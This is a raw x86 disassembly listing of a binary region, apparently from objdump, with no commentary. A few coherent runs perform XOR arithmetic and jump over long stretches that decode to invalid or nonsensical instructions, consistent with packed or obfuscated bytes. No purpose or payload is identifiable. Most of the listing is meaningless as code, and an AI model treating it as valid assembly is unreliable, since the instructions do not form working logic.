  40d0d5:	xlat   BYTE PTR ds:[ebx]
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    ebp,FWORD PTR ds:0xaa42cabb
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d0c5
  40d0fb:	cdq    
  40d0fc:	mov    BYTE PTR [esi],al
  40d0fe:	dec    DWORD PTR [edx-0x2b]
  40d101:	loop   0x40d0d2
  40d103:	sbb    DWORD PTR [ebx+eax*4+0x61b547a3],edx
  40d10a:	cmp    dh,BYTE PTR ss:[eax+0x4992de16]
  40d111:	stos   DWORD PTR es:[edi],eax
  40d112:	popa   
  40d113:	jb     0x40d0f6
  40d115:	out    dx,al
  40d116:	add    eax,0x5bf0c6cc
  40d11b:	or     BYTE PTR [eax+0x2],0xa3
  40d11f:	and    al,BYTE PTR [eax+0x6d5c62c6]
  40d125:	fisubr WORD PTR ds:0x52dc847b
  40d12b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d12c:	shl    BYTE PTR [edi],1
  40d12e:	sbb    ebx,edx
  40d130:	fisubr WORD PTR [ebx+0x27193c11]
  40d136:	xchg   ebx,eax
  40d137:	dec    ebp
  40d138:	inc    ebx
  40d139:	or     eax,0x8f962a29
  40d13e:	loop   0x40d11b
  40d140:	dec    esp
  40d141:	push   esp
  40d142:	into   
  40d143:	push   edx
  40d144:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d145:	or     DWORD PTR [esi],edi
  40d147:	or     DWORD PTR [esi-0x722a2841],ebx
  40d14d:	dec    esi
  40d14e:	fst    QWORD PTR [ebx-0x12]
  40d151:	repnz fsubrp st(0),st
  40d154:	inc    ecx
  40d155:	push   es
  40d156:	pusha  
  40d157:	inc    ebx
  40d158:	adc    eax,0x2289a7a6
  40d15d:	dec    edx
  40d15e:	fwait
  40d15f:	popa   
  40d160:	ret    
  40d161:	fld    TBYTE PTR [eax-0x37]
  40d164:	ret    
  40d165:	mov    edx,0x810357b7
  40d16a:	and    eax,DWORD PTR [ebp+0x78]
  40d16d:	repz xchg edx,eax
  40d16f:	mov    edi,0xfc5acf4
  40d174:	sub    eax,0x7d01a2d6
  40d179:	scas   al,BYTE PTR es:[edi]
  40d17a:	cmp    dh,BYTE PTR [ecx]
  40d17c:	sti    
  40d17d:	sbb    ecx,DWORD PTR [ebx+0x7026b3b0]
  40d183:	shl    DWORD PTR [ebx-0x1ca2618a],0xa
  40d18a:	test   BYTE PTR [ebx+0x10ca39a6],cl
  40d190:	adc    esi,DWORD PTR [eax-0x5c]
  40d193:	inc    esi
  40d194:	cdq    
  40d195:	sub    dh,BYTE PTR [esi]
  40d197:	adc    eax,0x762c97cd
  40d19c:	and    dl,BYTE PTR [esi-0x41]
  40d19f:	cs out 0x11,al
  40d1a2:	sbb    al,0xd9
  40d1a4:	call   0xa9a2f783
  40d1a9:	popf   
  40d1aa:	test   BYTE PTR [ebp-0x4b],dh
  40d1ad:	or     DWORD PTR [edi],edi
  40d1af:	fdivr  QWORD PTR [ebx+0x27]
  40d1b2:	sahf   
  40d1b3:	lahf   
  40d1b4:	fild   WORD PTR [esi+ecx*8-0x7b05cfac]
  40d1bb:	out    dx,al
  40d1bc:	pop    eax
  40d1bd:	pusha  
  40d1be:	divps  xmm1,XMMWORD PTR [ecx]
  40d1c1:	cmp    al,BYTE PTR [edx-0x23]
  40d1c4:	push   ecx
  40d1c5:	sahf   
  40d1c6:	call   0x6f6c:0xb9b6d487
  40d1cd:	retf   0xfbe1
  40d1d0:	fwait
  40d1d1:	sub    eax,0x4fdf2a36
  40d1d6:	jne    0x40d1c6
  40d1d8:	ja     0x40d171
  40d1da:	mov    ebp,DWORD PTR [edi]
  40d1dc:	aam    0x87
  40d1de:	fnstenv [edi]
  40d1e0:	inc    esp
  40d1e1:	(bad)  
  40d1e2:	call   FWORD PTR [ecx+0x713c7951]
  40d1e8:	cmp    ch,BYTE PTR [ebp-0x2b2fee28]
  40d1ee:	mov    edi,0xd47d1b2f
  40d1f3:	push   ds
  40d1f4:	xchg   DWORD PTR [edx+edx*1+0x637720dc],esi
  40d1fb:	div    DWORD PTR [ecx+edx*1]
  40d1fe:	and    dl,BYTE PTR [ecx+0x1d7df6a6]
  40d204:	cmp    eax,0x35d99b5a
  40d209:	dec    esi
  40d20a:	sub    DWORD PTR es:[edx],esp
  40d20d:	dec    esp
  40d20e:	jg     0x40d192
  40d210:	dec    ecx
  40d211:	jns    0x40d1d5
  40d213:	clc    
  40d214:	ja     0x40d274
  40d216:	push   esp
  40d217:	pop    ebp
  40d218:	jecxz  0x40d22d
  40d21a:	lock jge 0x40d1cf
  40d21d:	add    DWORD PTR [ecx+ecx*2+0x2956122e],0x9ff1c5f6
  40d228:	loope  0x40d25a
  40d22a:	sbb    DWORD PTR [ebp-0x42],0x90e38663
  40d231:	xchg   edi,eax
  40d232:	(bad)  
  40d233:	clc    
  40d234:	dec    BYTE PTR [ebx-0x13802f36]
  40d23a:	jne    0x40d26a
  40d23c:	test   dl,ch
  40d23e:	hlt    
  40d23f:	(bad)  
  40d241:	(bad)  
  40d242:	lods   al,BYTE PTR ds:[esi]
  40d243:	dec    ecx
  40d244:	sbb    edx,DWORD PTR [ecx]
  40d246:	mov    dh,0xca
  40d248:	xchg   esp,eax
  40d249:	sbb    ah,ah
  40d24b:	gs mov ebp,0xeb2b9079
  40d251:	mov    ah,0x9
  40d253:	out    0x2b,eax
  40d255:	cmc    
  40d256:	pop    ds
  40d257:	inc    ebp
  40d258:	(bad)
  40d25b:	add    al,0x25
  40d25d:	test   DWORD PTR [edx],0xbf26222d
  40d263:	out    0x17,al
  40d265:	push   0xd45d7b63
  40d26a:	and    eax,DWORD PTR [esi-0x49]
  40d26d:	inc    edx
  40d26e:	inc    edi
  40d26f:	into   
  40d270:	mov    ebx,0xf41d5f64
  40d275:	in     eax,0xd1
  40d277:	icebp  
  40d278:	rcl    DWORD PTR [esi],0x8f
  40d27b:	shl    DWORD PTR [edx-0xe745d8d],cl
  40d281:	clc    
  40d282:	sub    al,0x1e
  40d284:	pop    edx
  40d285:	add    DWORD PTR [eax+0x7c5fe700],ebx
  40d28b:	(bad)  
  40d28c:	and    BYTE PTR [eax+0x6d],cl
  40d28f:	or     ebx,ecx
  40d291:	adc    bl,BYTE PTR [edx]
  40d293:	aaa    
  40d294:	arpl   WORD PTR [ebx],sp
  40d296:	(bad)  
  40d297:	(bad)  
  40d298:	ins    DWORD PTR es:[edi],dx
  40d299:	pop    ebx
  40d29a:	push   edx
  40d29b:	xchg   ebp,eax
  40d29c:	dec    eax
  40d29d:	add    eax,0x2247cbe4
  40d2a2:	mov    BYTE PTR [eax],cl
  40d2a4:	cs bnd je 0x40d242
  40d2a8:	int3   
  40d2a9:	popa   
  40d2aa:	and    bh,cl
  40d2ac:	mov    ebx,0x630bf076
  40d2b1:	jge    0x40d290
  40d2b3:	jle    0x40d23c
  40d2b5:	push   eax
  40d2b6:	pop    ecx
  40d2b7:	and    al,0x3a
  40d2b9:	jg     0x40d264
  40d2bb:	sar    BYTE PTR [eax-0x33dd836],0xd9
  40d2c2:	xchg   ecx,eax
  40d2c3:	repnz call 0x3176:0xeb0f9239
  40d2cb:	rol    BYTE PTR gs:[esi-0x47],1
  40d2cf:	push   esp
  40d2d0:	es jbe 0x40d2ea
  40d2d3:	inc    eax
  40d2d4:	jge    0x40d2dd
  40d2d6:	push   ebx
  40d2d7:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40d2d9:	cmovs  esi,DWORD PTR [ecx]
  40d2dc:	out    dx,eax
  40d2dd:	scas   al,BYTE PTR es:[edi]
  40d2de:	arpl   WORD PTR [esi+esi*8+0x42],bp
  40d2e2:	push   es
  40d2e3:	mov    dh,0xa8
  40d2e5:	std    
  40d2e6:	adc    esp,DWORD PTR [ecx+0x3]
  40d2e9:	xor    DWORD PTR ds:0xf6e7f92d,eax
  40d2ef:	dec    esi
  40d2f0:	aad    0x23
  40d2f2:	fwait
  40d2f3:	ja     0x40d2fd
  40d2f5:	das    
  40d2f6:	or     eax,0x282be60e
  40d2fb:	or     BYTE PTR [ebx+eiz*4],bl
  40d2fe:	pusha  
  40d2ff:	sub    DWORD PTR [ecx+eiz*2+0x11],edi
  40d303:	daa    
  40d304:	fucomip st,st(5)
  40d306:	jae    0x40d338
  40d308:	pop    edx
  40d309:	in     al,dx
  40d30a:	and    DWORD PTR [eax],edi
  40d30c:	jg     0x40d300
  40d30e:	test   DWORD PTR [edx],ebx
  40d310:	and    ch,BYTE PTR [ebp+0x736fb422]
  40d316:	mov    bl,0xc7
  40d318:	fisub  DWORD PTR [esi+0x21]
  40d31b:	sahf   
  40d31c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d31d:	aaa    
  40d31e:	xchg   esi,eax
  40d31f:	or     BYTE PTR [edi-0x1c72423e],bh
  40d325:	sar    BYTE PTR [edx-0x66da8480],1
  40d32b:	xor    BYTE PTR [ecx+edi*8+0x6e],bh
  40d32f:	cli    
  40d330:	sub    cl,BYTE PTR [edx]
  40d332:	xchg   edi,eax
  40d333:	iret   
  40d334:	cli    
  40d335:	and    cl,BYTE PTR [ebx]
  40d337:	out    0xab,eax
  40d339:	daa    
  40d33a:	cmp    DWORD PTR [ecx+0x1757fbef],esp
  40d340:	fsub   DWORD PTR [esi+0x2835d2ef]
  40d346:	and    BYTE PTR [edx-0x7d],ah
  40d349:	add    bh,BYTE PTR [ebp-0x6c]
  40d34c:	mov    eax,0x142ee9ad
  40d351:	loopne 0x40d3a6
  40d353:	sub    al,0xdc
  40d355:	xchg   BYTE PTR [esp+eiz*2],bl
  40d358:	xor    DWORD PTR [edx-0x6c],0x400ca1ce
  40d35f:	cmp    esi,ebx
  40d361:	mov    BYTE PTR [ecx-0x6da9112b],ch
  40d367:	jecxz  0x40d339
  40d369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d36a:	sbb    DWORD PTR [ecx-0x6ce068e7],0x86947902
  40d374:	push   edx
  40d375:	push   ecx
  40d376:	cmp    al,0xc3
  40d378:	inc    esp
  40d379:	(bad)
  40d37d:	retf   0xe8b9
  40d380:	arpl   WORD PTR [eax-0x4fbdf1e7],si
  40d386:	mov    esp,0xa7cc852
  40d38b:	add    ah,BYTE PTR [edi-0x25]
  40d38e:	pop    ds
  40d38f:	test   BYTE PTR [esi+edx*2],dh
  40d392:	mov    dh,0x9a
  40d394:	es aaa 
  40d396:	adc    eax,0x9408c463
  40d39b:	cdq    
  40d39c:	mov    ah,0x2f
  40d39e:	iret   
  40d39f:	jle    0x40d41b
  40d3a1:	mov    esp,0x9398c3cb
  40d3a6:	adc    ah,bh
  40d3a8:	mov    al,ds:0x20f1ccba
  40d3ad:	or     esp,eax
  40d3af:	xor    DWORD PTR [eax],0x9be91e4c
  40d3b5:	inc    ebx
  40d3b6:	cdq    
  40d3b7:	out    0x87,eax
  40d3b9:	es pop ecx
  40d3bb:	mov    al,0xa4
  40d3bd:	push   edx
  40d3be:	retf   0x6503
  40d3c1:	test   al,0x5d
  40d3c3:	daa    
  40d3c4:	popa   
  40d3c5:	xor    al,0xf2
  40d3c7:	sub    BYTE PTR [edi-0x33],0x95
  40d3cb:	xor    al,bh
  40d3cd:	cmp    bl,BYTE PTR [ebx]
  40d3cf:	push   0x8487ed9a
  40d3d4:	std    
  40d3d5:	sbb    BYTE PTR [ebp-0x7e],bl
  40d3d8:	xchg   edi,eax
  40d3d9:	ds (bad) 
  40d3db:	push   esi
  40d3dc:	pop    ebx
  40d3dd:	in     al,0x7c
  40d3df:	jns    0x40d3ae
  40d3e1:	pusha  
  40d3e2:	lock sbb edi,ebp
  40d3e5:	push   eax
  40d3e6:	jns    0x40d3a9
  40d3e8:	or     DWORD PTR [esi-0x536a18fb],ebx
  40d3ee:	call   0xf502:0x685adf50
  40d3f5:	mov    al,0x41
  40d3f7:	pop    edx
  40d3f8:	xchg   ebp,eax
  40d3f9:	jl     0x40d427
  40d3fb:	stc    
  40d3fc:	mov    eax,ds:0xcab8cd44
  40d401:	jl     0x40d3ce
  40d403:	pop    ss
  40d404:	jmp    0x3ecf:0x9323a4ef
  40d40b:	add    BYTE PTR ds:0xe558c084,al
  40d411:	popa   
  40d412:	xchg   BYTE PTR [edi*8-0x11174675],cl
  40d419:	and    cl,BYTE PTR [ebp-0x80]
  40d41c:	cmp    al,0x43
  40d41e:	test   eax,0xf0b14bef
  40d423:	loope  0x40d440
  40d425:	cdq    
  40d426:	outs   dx,BYTE PTR ds:[esi]
  40d427:	sti    
  40d428:	mov    eax,0x867c00c2
  40d42d:	test   DWORD PTR [ebx+eax*1],edi
  40d430:	xor    al,0xa3
  40d432:	rcr    edi,0x17
  40d435:	cwde   
  40d436:	xor    eax,0xc77afc27
  40d43b:	sbb    al,BYTE PTR [eax]
  40d43d:	xlat   BYTE PTR ds:[ebx]
  40d43e:	pop    es
  40d43f:	push   ebx
  40d440:	sbb    BYTE PTR ds:0x9423d134,bh
  40d446:	pop    edi
  40d447:	enter  0x5d3e,0x26
  40d44b:	xchg   ebp,eax
  40d44c:	lods   eax,DWORD PTR ds:[esi]
  40d44d:	pushf  
  40d44e:	fbld   TBYTE PTR [esp+edx*4]
  40d451:	int3   
  40d452:	(bad)  
  40d453:	mov    ds:0xc871f5bc,al
  40d458:	pop    ds
  40d459:	push   cs
  40d45a:	scas   eax,DWORD PTR es:[edi]
  40d45b:	or     esp,DWORD PTR [ecx]
  40d45d:	std    
  40d45e:	scas   eax,DWORD PTR es:[edi]
  40d45f:	das    
  40d460:	(bad)  
  40d461:	pop    edx
  40d462:	data16 setnp bl
  40d466:	cmp    bh,ah
  40d468:	lea    esp,[edx]
  40d46a:	mov    eax,0x6065836b
  40d46f:	iret   
  40d470:	lods   al,BYTE PTR ds:[esi]
  40d471:	fstp   DWORD PTR [esi]
  40d473:	sub    ch,ch
  40d475:	out    0xa9,al
  40d477:	push   es
  40d478:	or     edx,DWORD PTR [eax]
  40d47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d47b:	outs   dx,DWORD PTR ds:[esi]
  40d47c:	dec    eax
  40d47d:	cdq    
  40d47e:	test   DWORD PTR [ebx-0x77],eax
  40d481:	or     eax,0x389c1ef0
  40d486:	dec    esp
  40d487:	fucomip st,st(0)
  40d489:	dec    esp
  40d48a:	sub    cl,BYTE PTR [edx-0x18]
  40d48d:	mov    ebp,0xbae2058f
  40d492:	(bad)  [ebp-0x69]
  40d495:	pop    ebp
  40d496:	daa    
  40d497:	inc    ebx
  40d498:	mov    DWORD PTR [edi-0xb],eax
  40d49b:	mov    edi,DWORD PTR [ebp-0x8]
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0xecd3:0xb81a1d63
  40d4c6:	sub    al,0xc
  40d4c8:	jmp    0x70b16e96
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d4f7
  40d4d2:	es hlt 
  40d4d4:	sub    esi,DWORD PTR [edx]
  40d4d6:	push   ebx
  40d4d7:	cmp    dl,BYTE PTR ds:[edi-0x339d3284]
  40d4de:	cmp    al,0x61
  40d4e0:	loopne 0x40d47e
  40d4e2:	xchg   ebx,eax
  40d4e3:	mov    ecx,edi
  40d4e5:	add    DWORD PTR [edx-0x7c],edi
  40d4e8:	dec    DWORD PTR [esi+eax*4]
  40d4eb:	mov    cs,WORD PTR [ebx+0x2b]
  40d4ee:	jmp    0x9fe68d66
  40d4f3:	lahf   
  40d4f4:	mov    ebx,0x7d901974
  40d4f9:	in     al,dx
  40d4fa:	ins    DWORD PTR es:[edi],dx
  40d4fb:	es pop ds
  40d4fd:	cs xchg esi,eax
  40d4ff:	xchg   esp,eax
  40d500:	xor    eax,0x684373c2
  40d505:	into   
  40d506:	leave  
  40d507:	push   ds
  40d508:	test   eax,0x85a7b205
  40d50d:	dec    ebp
  40d50e:	mov    edx,0x2fa90b25
  40d513:	inc    ebx
  40d514:	mov    al,0xfe
  40d516:	les    ecx,FWORD PTR [esi]
  40d518:	or     al,0x0
  40d51a:	mov    al,ds:0x35b3118
  40d51f:	push   ecx
  40d520:	adc    ebx,DWORD PTR [esi-0x3876c982]
  40d526:	test   al,0x28
  40d528:	scas   eax,DWORD PTR es:[edi]
  40d529:	jno    0x40d4de
  40d52b:	inc    eax
  40d52c:	out    0x62,al
  40d52e:	jmpw   0xbfdf
  40d532:	(bad)  
  40d533:	ins    DWORD PTR es:[edi],dx
  40d534:	xor    al,0xa0
  40d536:	test   DWORD PTR [ebp+0x46],0x77042d26
  40d53d:	imul   esp,DWORD PTR [esi-0x6811ef19],0xffffffdf
  40d544:	mov    ah,bh
  40d546:	fcom   DWORD PTR [ebx+0x5abe4363]
  40d54c:	lock in eax,dx
  40d54e:	(bad)  
  40d54f:	xchg   esp,eax
  40d550:	push   esi
  40d551:	repz ret 0x1db7
  40d555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d556:	mov    bh,0x2f
  40d558:	mov    BYTE PTR [esp+ebp*2-0x3c],ah
  40d55c:	lahf   
  40d55d:	sar    BYTE PTR [eax+0xc680da9],cl
  40d563:	mov    dl,dh
  40d565:	pop    edx
  40d566:	pop    esp
  40d567:	out    dx,al
  40d568:	sar    DWORD PTR [eax],1
  40d56a:	mov    ecx,esp
  40d56c:	leave  
  40d56d:	stos   DWORD PTR es:[edi],eax
  40d56e:	sbb    al,0x73
  40d570:	daa    
  40d571:	mov    ah,0x93
  40d573:	stos   BYTE PTR es:[edi],al
  40d574:	push   esi
  40d575:	mov    edi,DWORD PTR [edi-0x24d5c7bd]
  40d57b:	ror    BYTE PTR [ecx+0x4276f808],0x26
  40d582:	add    ecx,0x1ed311c1
  40d588:	pop    ebp
  40d589:	mov    ebp,0x172deb3b
  40d58e:	sbb    DWORD PTR [ecx+0x69],0xffffffd9
  40d592:	push   esi
  40d593:	push   0x57606a92
  40d598:	xchg   DWORD PTR [edx],edi
  40d59a:	and    dl,al
  40d59c:	jo     0x40d5af
  40d59e:	push   ds
  40d59f:	jns    0x40d57a
  40d5a1:	dec    ebp
  40d5a2:	xchg   ebp,eax
  40d5a3:	pop    esi
  40d5a4:	mov    cl,0x79
  40d5a6:	pop    edx
  40d5a7:	inc    ebp
  40d5a8:	cmp    eax,0x3db94f10
  40d5ad:	xchg   edi,eax
  40d5ae:	repnz cmc 
  40d5b0:	or     al,0x40
  40d5b2:	mov    ebp,0x6407bce8
  40d5b7:	push   ds
  40d5b8:	and    dh,BYTE PTR [ebp-0x55]
  40d5bb:	or     BYTE PTR [esi+eiz*4+0x4e],ch
  40d5bf:	imul   ebp,DWORD PTR [ecx],0x16
  40d5c2:	mov    cl,0x46
  40d5c4:	add    dh,BYTE PTR [eax-0x44]
  40d5c7:	popf   
  40d5c8:	imul   ecx,DWORD PTR ds:0x784de33d,0x4f
  40d5cf:	retf   
  40d5d0:	mov    DWORD PTR [esi],esp
  40d5d2:	cmp    edi,DWORD PTR [eax]
  40d5d4:	outs   dx,BYTE PTR ds:[esi]
  40d5d5:	fstp   QWORD PTR [ebx]
  40d5d7:	jns    0x40d5ae
  40d5d9:	mov    ds:0x42b2558,al
  40d5de:	shr    DWORD PTR [ebp-0x57],1
  40d5e1:	fist   WORD PTR [esi+0x737abc36]
  40d5e7:	xchg   BYTE PTR [edx+0x7b064b36],ah
  40d5ed:	sar    BYTE PTR [edi-0x4b134f2e],1
  40d5f3:	jg     0x40d5db
  40d5f5:	ins    DWORD PTR es:[edi],dx
  40d5f6:	mov    edx,DWORD PTR [ecx+0x24]
  40d5f9:	jb     0x40d61e
  40d5fb:	cmc    
  40d5fc:	adc    BYTE PTR [ebx+ebp*2+0x1a],0x5e
  40d601:	cmp    al,0x42
  40d603:	test   eax,0x5c5d025d
  40d608:	mov    DWORD PTR [ecx],0x9291db57
  40d60e:	(bad)  
  40d60f:	(bad)  
  40d610:	sti    
  40d611:	push   cs
  40d612:	sub    dl,dh
  40d614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d615:	jno    0x40d617
  40d617:	sbb    eax,0x98343253
  40d61c:	push   edi
  40d61d:	add    ch,0x33
  40d620:	push   ebp
  40d621:	ficom  DWORD PTR [ebx+0x35]
  40d624:	cmc    
  40d625:	pop    eax
  40d626:	sbb    BYTE PTR [ebp-0x42327061],dl
  40d62c:	add    BYTE PTR [edi+0x3e],0x4d
  40d630:	loop   0x40d62e
  40d632:	dec    ebx
  40d633:	into   
  40d634:	hlt    
  40d635:	mov    bl,0x65
  40d637:	cmp    ebx,DWORD PTR [ebx]
  40d639:	jg     0x40d642
  40d63b:	inc    edx
  40d63c:	mov    bh,0x5d
  40d63e:	adc    ch,dh
  40d640:	sub    DWORD PTR [esp+edx*4],0x4d
  40d644:	or     esp,DWORD PTR [edi]
  40d646:	jnp    0x40d6bf
  40d648:	or     eax,0x38a3a218
  40d64d:	adc    ecx,DWORD PTR [edi+ebp*2]
  40d650:	cmp    esi,ebx
  40d652:	add    ecx,ebp
  40d654:	mov    cl,0x5a
  40d656:	xor    eax,0x46b8182e
  40d65b:	(bad)  
  40d65c:	daa    
  40d65d:	ins    DWORD PTR es:[edi],dx
  40d65e:	add    ecx,esi
  40d660:	adc    BYTE PTR [ecx-0x440fe31],dh
  40d666:	mov    eax,DWORD PTR [edx-0x2eb3c1ba]
  40d66c:	adc    DWORD PTR [ebp+0x136af1ff],ebp
  40d672:	fmulp  st(1),st
  40d674:	pop    eax
  40d675:	sub    DWORD PTR [ebp-0x537ec09c],esi
  40d67b:	jmp    0xf428ec46
  40d680:	pop    ebx
  40d681:	je     0x40d60f
  40d683:	test   ah,ah
  40d685:	mov    al,ds:0x2944294a
  40d68a:	inc    esi
  40d68b:	pop    ds
  40d68c:	xchg   DWORD PTR [edi-0x28e55a6b],ecx
  40d692:	stos   BYTE PTR es:[edi],al
  40d693:	cmp    DWORD PTR [ebx-0x50eac324],eax
  40d699:	jo     0x40d6ab
  40d69b:	das    
  40d69c:	push   ss
  40d69d:	stc    
  40d69e:	mov    esi,0x3fd0eefb
  40d6a3:	push   ds
  40d6a4:	js     0x40d71c
  40d6a6:	fs xchg ebx,eax
  40d6a8:	leave  
  40d6a9:	xor    DWORD PTR [edx],edi
  40d6ab:	jle    0x40d715
  40d6ad:	jo     0x40d69f
  40d6af:	mov    edi,0x1eddda66
  40d6b4:	sub    al,0x7a
  40d6b6:	adc    DWORD PTR ds:0x58a623a6,0xf842a347
  40d6c0:	xor    BYTE PTR [edi+0x1c],ch
  40d6c3:	mov    bl,0x85
  40d6c5:	mov    eax,0x9d6229f4
  40d6ca:	xor    ebx,esp
  40d6cc:	jge    0x40d660
  40d6ce:	ins    BYTE PTR es:[edi],dx
  40d6cf:	gs dec ebp
  40d6d1:	jmp    0x40d68b
  40d6d3:	pop    ecx
  40d6d4:	jmp    0x40d735
  40d6d6:	cmp    al,BYTE PTR [ecx]
  40d6d8:	xchg   edx,eax
  40d6d9:	fwait
  40d6da:	mov    ch,0xa3
  40d6dc:	push   eax
  40d6dd:	and    bh,BYTE PTR [edx+0x944e947]
  40d6e3:	mov    ?,WORD PTR [edx+0x7da8e39a]
  40d6e9:	mov    cl,0x13
  40d6eb:	xchg   edx,eax
  40d6ec:	loopne 0x40d73a
  40d6ee:	jg     0x40d6ac
  40d6f0:	mov    ebp,0xd6d19fe1
  40d6f5:	pop    ss
  40d6f6:	jle    0x40d734
  40d6f8:	or     BYTE PTR [eax],bh
  40d6fa:	data16 fisubr WORD PTR [ecx+0x3f]
  40d6fe:	scas   al,BYTE PTR es:[edi]
  40d6ff:	jecxz  0x40d698
  40d701:	(bad)  
  40d702:	loopne 0x40d782
  40d704:	dec    edx
  40d705:	rol    DWORD PTR [esi+0x5e97a299],cl
  40d70b:	in     al,0x60
  40d70d:	xchg   esp,eax
  40d70e:	adc    DWORD PTR [edx],0x6083468
  40d714:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40d716:	mov    DWORD PTR [edi],ecx
  40d718:	push   esp
  40d719:	imul   esp,DWORD PTR [ecx-0x413dfa28],0x5bd0b721
  40d723:	jae    0x40d718
  40d725:	rol    DWORD PTR [ebx-0x16508373],0x6d
  40d72c:	jmp    FWORD PTR [ecx+0x446d2730]
  40d732:	mov    WORD PTR [ecx],es
  40d734:	test   eax,0x90d15ad8
  40d739:	call   0x20cb:0x61e7fee4
  40d740:	adc    DWORD PTR [esi+0x73],esp
  40d743:	push   ebp
  40d744:	add    BYTE PTR [eax+0x6a06be0b],0xa0
  40d74b:	sub    al,0x45
  40d74d:	(bad)  
  40d74e:	loopne 0x40d74e
  40d750:	inc    esp
  40d751:	ds xchg esi,eax
  40d753:	ja     0x40d7a0
  40d755:	mov    ah,0xa
  40d757:	hlt    
  40d758:	ins    DWORD PTR es:[edi],dx
  40d759:	cmp    al,0x3
  40d75b:	add    cl,BYTE PTR [ebx+0x3b]
  40d75e:	lea    ecx,[ebx]
  40d760:	pop    es
  40d761:	add    DWORD PTR [ebx],edx
  40d763:	stc    
  40d764:	sbb    bl,dh
  40d766:	pop    ss
  40d767:	jmp    0x23d4:0xd5a7eca3
  40d76e:	xor    eax,0xd9a5cc77
  40d773:	jle    0x40d75b
  40d775:	xchg   ebx,eax
  40d776:	and    edi,DWORD PTR [ebx-0x67]
  40d779:	jo     0x40d778
  40d77b:	jl     0x40d708
  40d77d:	mov    dl,0xec
  40d77f:	aas    
  40d780:	fs or  edx,ebp
  40d783:	fndisi(8087 only) 
  40d785:	sbb    DWORD PTR ds:0xeb4b1731,ebx
  40d78b:	sbb    dh,ch
  40d78d:	repnz sbb DWORD PTR [edi+0x6f],edi
  40d791:	pop    ecx
  40d792:	pop    ebp
  40d793:	sub    DWORD PTR [esp+eiz*2],0x48
  40d797:	inc    ebp
  40d798:	jne    0x40d7e8
  40d79a:	xlat   BYTE PTR ds:[ebx]
  40d79b:	mov    ?,ecx
  40d79d:	nop
  40d79e:	mov    eax,0x3c35f6a8
  40d7a3:	cld    
  40d7a4:	outs   dx,DWORD PTR ds:[esi]
  40d7a5:	shl    ecx,1
  40d7a7:	sbb    DWORD PTR [edx-0x31],edi
  40d7aa:	mov    gs,WORD PTR [edi-0x79b0f9da]
  40d7b0:	data16 or ch,al
  40d7b3:	inc    ecx
  40d7b4:	lods   al,BYTE PTR fs:[esi]
  40d7b6:	inc    edi
  40d7b7:	dec    ecx
  40d7b8:	dec    esp
  40d7b9:	(bad)  
  40d7ba:	rol    esp,cl
  40d7bc:	lds    ebx,FWORD PTR [ecx-0x26]
  40d7bf:	push   es
  40d7c0:	rcl    DWORD PTR [ebp+0x7140fb26],0x17
  40d7c7:	les    ecx,FWORD PTR [eax-0x15]
  40d7ca:	outs   dx,BYTE PTR ds:[esi]
  40d7cb:	cmc    
  40d7cc:	push   eax
  40d7cd:	loopne 0x40d7a2
  40d7cf:	jmp    0x47b4:0x642060c0
  40d7d6:	out    0x7b,al
  40d7d8:	sbb    eax,DWORD PTR [esi-0xb]
  40d7db:	shl    DWORD PTR [edi+0x5e536457],cl
  40d7e1:	repz aad 0x29
  40d7e4:	ins    BYTE PTR es:[edi],dx
  40d7e5:	cdq    
  40d7e6:	pop    eax
  40d7e7:	and    BYTE PTR [edi],cl
  40d7e9:	mov    al,ds:0xe444c0e4
  40d7ee:	push   0xffffffd8
  40d7f0:	push   ebx
  40d7f1:	ins    DWORD PTR es:[edi],dx
  40d7f2:	mov    edi,0xa3336070
  40d7f7:	sbb    eax,0xd789f9ce
  40d7fc:	mov    ecx,0x9c700f9f
  40d801:	jp     0x40d7f3
  40d803:	jle    0x40d7c4
  40d805:	(bad)  
  40d806:	stos   DWORD PTR es:[edi],eax
  40d807:	loopne 0x40d871
  40d809:	fidivr DWORD PTR [edi-0x7]
  40d80c:	xchg   ecx,eax
  40d80d:	push   ss
  40d80e:	ret    0x670d
  40d811:	dec    edx
  40d812:	dec    ecx
  40d813:	lods   eax,DWORD PTR ds:[esi]
  40d814:	leave  
  40d815:	jmp    0x567e5722
  40d81a:	test   DWORD PTR [edi],0x7082323f
  40d820:	aad    0x39
  40d822:	in     eax,dx
  40d823:	push   esp
  40d824:	mov    ch,0x53
  40d826:	cmp    al,0x67
  40d829:	sbb    ch,ch
  40d82b:	push   esp
  40d82c:	push   esp
  40d82d:	xor    eax,0x420501d1
  40d832:	arpl   bx,si
  40d834:	lock push ebx
  40d836:	pop    eax
  40d837:	push   DWORD PTR [edi]
  40d839:	(bad)  
  40d83a:	jmp    0x40d82e
  40d83c:	or     DWORD PTR [ebp+0x1ccf6aa7],0xffffff97
  40d843:	out    0x5d,eax
  40d845:	jb     0x40d87f
  40d847:	retf   
  40d848:	arpl   WORD PTR [edx],ax
  40d84a:	inc    ebp
  40d84b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
